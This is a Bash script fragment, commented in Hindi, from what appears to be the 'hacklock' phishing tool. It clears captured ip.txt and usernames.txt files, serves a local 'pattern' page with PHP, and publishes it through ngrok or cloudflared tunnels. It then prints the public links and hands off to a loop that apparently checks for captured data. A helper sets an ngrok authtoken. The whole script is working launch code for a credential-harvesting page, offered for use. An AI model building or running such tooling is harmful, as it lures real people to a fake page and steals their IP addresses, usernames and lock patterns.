# --- Kali-friendly start() और helpers ---

# helper: find executable (system-wide पहले, फिर $HOME/hacklock)
find_exec() {
  name="$1"
  if command -v "$name" >/dev/null 2>&1; then
    command -v "$name"
  elif [[ -x "$HOME/hacklock/$name" ]]; then
    echo "$HOME/hacklock/$name"
  else
    echo ""
  fi
}

start() {
  # साफ़-सफ़ाई पहले
  rm -f "$HOME/hacklock/core/pattern/ip.txt" 2>/dev/null || true
  rm -f "$HOME/hacklock/core/pattern/usernames.txt" 2>/dev/null || true
  rm -f "$HOME/hacklock/cloudflare-log" 2>/dev/null || true

  # चेक कि php मौजूद है
  if ! command -v php >/dev/null 2>&1; then
    echo "[!] php not found. Install php and try again."
    return 1
  fi

  # कौन से forwarders उपलब्ध हैं
  NGROK_BIN=$(find_exec ngrok)
  CLOUDFLARE_BIN=$(find_exec cloudflared)

  if [[ -z "$NGROK_BIN" && -z "$CLOUDFLARE_BIN" ]]; then
    echo "[!] Neither ngrok nor cloudflared found. Install at least one."
    return 1
  fi

  # php server शुरू करो (local)
  echo "[*] Starting php server on 127.0.0.1:5678 ..."
  cd "$HOME/hacklock/core/pattern" || { echo "core/pattern missing"; return 1; }
  php -S 127.0.0.1:5678 >/dev/null 2>&1 &
  PHP_PID=$!
  sleep 2

  # ngrok शुरू (यदि उपलब्ध)
  if [[ -n "$NGROK_BIN" ]]; then
    echo "[*] Starting ngrok ..."
    nohup "$NGROK_BIN" http 127.0.0.1:5678 >/dev/null 2>&1 &
    sleep 3
    # ngrok की local API से लिंक निकालो
    if curl -s http://127.0.0.1:4040/api/tunnels >/dev/null 2>&1; then
      NGROK_LINK=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -oE '"public_url":"https://[^"]+' | head -n1 | sed 's/.*:"//')
    else
      NGROK_LINK=""
    fi
  else
    NGROK_LINK=""
  fi

  # cloudflared शुरू (यदि उपलब्ध)
  if [[ -n "$CLOUDFLARE_BIN" ]]; then
    echo "[*] Starting cloudflared ..."
    # logfile बनाएँ
    LOGFILE="$HOME/hacklock/cloudflare-log"
    nohup "$CLOUDFLARE_BIN" tunnel --url http://127.0.0.1:5678 > "$LOGFILE" 2>&1 &
    sleep 6
    # logfile में public link खोजो (trycloudflare.com pattern)
    if [[ -f "$LOGFILE" ]]; then
      CLOUDFLARE_LINK=$(grep -oE 'https://[-0-9a-z]+\.trycloudflare\.com' "$LOGFILE" | head -n1 || true)
    else
      CLOUDFLARE_LINK=""
    fi
  else
    CLOUDFLARE_LINK=""
  fi

  # आउटपुट
  if [[ -n "$NGROK_LINK" ]]; then
    printf "\e[1;92m[*] (NGROK) link: \e[0m\e[1;77m%s\e[0m\n" "$NGROK_LINK"
  else
    echo "[!] ngrok link not found (ngrok may be not running or API not reachable)."
  fi

  if [[ -n "$CLOUDFLARE_LINK" ]]; then
    printf "\e[1;92m[*] (Cloudflare) link: \e[0m\e[1;77m%s\e[0m\n" "$CLOUDFLARE_LINK"
  else
    echo "[!] cloudflared link not found in logfile (check $HOME/hacklock/cloudflare-log)."
  fi

  # अब checkfound loop call करो (जैसा पुराना flow था)
  checkfound
}

# fixer: ngrok authtoken और permissions के लिए सरल helper
fixer() {
  NGROK_BIN=$(find_exec ngrok)
  if [[ -z "$NGROK_BIN" ]]; then
    echo "[!] ngrok not found. Place ngrok in PATH or in $HOME/hacklock/"
    return 1
  fi

  read -p $'\n[+] Enter NGROK AUTHTOKEN: ' token
  if [[ -n "$token" ]]; then
    "$NGROK_BIN" authtoken "$token"
    echo "[*] ngrok authtoken set."
  else
    echo "[!] No token provided."
  fi
}
